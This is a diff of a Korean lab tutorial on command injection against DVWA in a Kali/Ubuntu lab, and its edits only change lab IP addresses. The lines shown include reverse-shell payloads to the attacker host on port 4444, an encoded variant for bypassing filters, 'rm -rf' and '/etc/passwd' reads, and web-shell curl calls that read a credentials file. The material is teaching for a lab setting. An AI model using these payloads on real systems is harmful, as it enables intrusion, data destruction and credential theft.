@@ -20,8 +20,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) |
-| 대상 | Ubuntu + DVWA (192.168.0.30/DVWA/) |
+| 공격자 | Kali Linux (192.168.56.10) |
+| 대상 | Ubuntu + DVWA (192.168.56.30/DVWA/) |
 | 도구 | nc (netcat), tcpdump, curl |
 
 ---
@@ -128,7 +128,7 @@ ip=127.0.0.1; rm -rf /var/www/html/
 ip=127.0.0.1; cat /etc/passwd
 
 # 리버스 쉘 연결
-ip=127.0.0.1; bash -i >& /dev/tcp/192.168.0.10/4444 0>&1
+ip=127.0.0.1; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
 ```
 
 **안전한 코드**:
@@ -156,7 +156,7 @@ from flask import request
 
 host = request.args.get('host')
 os.system(f"ping -c 1 {host}")
-# 공격: host=127.0.0.1;bash -i >& /dev/tcp/192.168.0.10/4444 0>&1
+# 공격: host=127.0.0.1;bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
 # → Reverse Shell 생성
 ```
 
@@ -234,7 +234,7 @@ flowchart TD
 
 ```bash
 # DVWA에 입력
-127.0.0.1; ping -c 1 192.168.0.10
+127.0.0.1; ping -c 1 192.168.56.10
 
 # Kali에서 ICMP 수신 대기
 sudo tcpdump -i eth0 icmp
@@ -257,7 +257,7 @@ sudo tcpdump -i eth0 icmp
 
 ## 2. 실습 1 — Low 레벨 기본 명령 삽입
 
-**경로**: `http://192.168.0.30/DVWA/vulnerabilities/exec/`
+**경로**: `http://192.168.56.30/DVWA/vulnerabilities/exec/`
 
 ### 2.1 기본 동작 확인
 
@@ -310,12 +310,12 @@ IP 입력창에 정상 입력:
 
 ```mermaid
 sequenceDiagram
-    participant K as 공격자 (Kali 192.168.0.10)
-    participant D as DVWA 서버 (Ubuntu 192.168.0.30)
+    participant K as 공격자 (Kali 192.168.56.10)
+    participant D as DVWA 서버 (Ubuntu 192.168.56.30)
 
     K->>K: nc -lvnp 4444 (리스너 대기)
     K->>D: DVWA Command Injection에 Reverse Shell 입력
-    D->>D: bash -i >& /dev/tcp/192.168.0.10/4444 0>&1 실행
+    D->>D: bash -i >& /dev/tcp/192.168.56.10/4444 0>&1 실행
     D->>K: TCP 4444 포트로 아웃바운드 연결
     K->>K: 쉘 수신 완료 (www-data@ubuntu)
     K->>D: id, whoami, cat /etc/passwd 등 명령 실행
@@ -339,20 +339,20 @@ nc -lvnp 4444
 **2단계: DVWA Command Injection 입력창에 Reverse Shell 명령 입력**
 
 ```
-127.0.0.1; bash -i >& /dev/tcp/192.168.0.10/4444 0>&1
+127.0.0.1; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
 ```
 
 **3단계: URL 인코딩 버전 (필터 우회 시 활용)**
 
 ```
-127.0.0.1%3B+bash+-i+>%26+/dev/tcp/192.168.0.10/4444+0>%261
+127.0.0.1%3B+bash+-i+>%26+/dev/tcp/192.168.56.10/4444+0>%261
 ```
 
 **4단계: Kali 터미널에서 쉘 획득 확인**
 
 ```
 listening on [any] 4444 ...
-connect to [192.168.0.10] from (UNKNOWN) [192.168.0.30] 54321
+connect to [192.168.56.10] from (UNKNOWN) [192.168.56.30] 54321
 bash: no job control in this shell
 www-data@ubuntu:/var/www/html/dvwa/vulnerabilities/exec$
 ```
@@ -383,16 +383,16 @@ Kali에서 curl로 웹쉘을 통해 명령을 실행합니다.
 
 ```bash
 # 현재 계정 확인
-curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=id"
+curl "http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=id"
 
 # 시스템 정보 확인
-curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=uname+-a"
+curl "http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=uname+-a"
 
 # 민감 파일 열람 — www-data 권한으로 읽을 수 있는 DB 설정 파일(계정·비밀번호 노출)
-curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=cat+/var/www/html/DVWA/config/config.inc.php"
+curl "http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=cat+/var/www/html/DVWA/config/config.inc.php"
 
 # 디렉터리 목록 확인
-curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html"
+curl "http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html"
 ```
 
 > 웹쉘은 웹 서버 계정인 **`www-data` 권한**으로 동작합니다. 그래서 `/etc/passwd`나 DB 설정 파일(`config.inc.php`)은 읽히지만, `/etc/shadow`처럼 **root 전용 파일은 "Permission denied"** 가 납니다. 이 파일들을 읽으려면 별도의 **권한 상승(Privilege Escalation)** 이 필요합니다.
@@ -402,7 +402,7 @@ curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/ht
 
 ```bash
 # 실습 후 웹쉘 삭제
-curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=rm+/var/www/html/DVWA/hackable/uploads/shell.php"
+curl "http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=rm+/var/www/html/DVWA/hackable/uploads/shell.php"
 # 또는 SSH로 직접 삭제
 ```
 
@@ -425,15 +425,15 @@ sudo tcpdump -i eth0 icmp
 **2단계: DVWA Command Injection 입력**
 
 ```
-127.0.0.1; ping -c 3 192.168.0.10
+127.0.0.1; ping -c 3 192.168.56.10
 ```
 
 **3단계: Kali tcpdump 출력에서 ICMP 요청 확인**
 
 ```
-192.168.0.30 > 192.168.0.10: ICMP echo request, id 1234, seq 1, length 64
-192.168.0.30 > 192.168.0.10: ICMP echo request, id 1234, seq 2, length 64
-192.168.0.30 > 192.168.0.10: ICMP echo request, id 1234, seq 3, length 64
+192.168.56.30 > 192.168.56.10: ICMP echo request, id 1234, seq 1, length 64
+192.168.56.30 > 192.168.56.10: ICMP echo request, id 1234, seq 2, length 64
+192.168.56.30 > 192.168.56.10: ICMP echo request, id 1234, seq 3, length 64
 ```
 
 3개의 ICMP 요청이 수신되면 명령이 실행된 것이 확인됩니다.
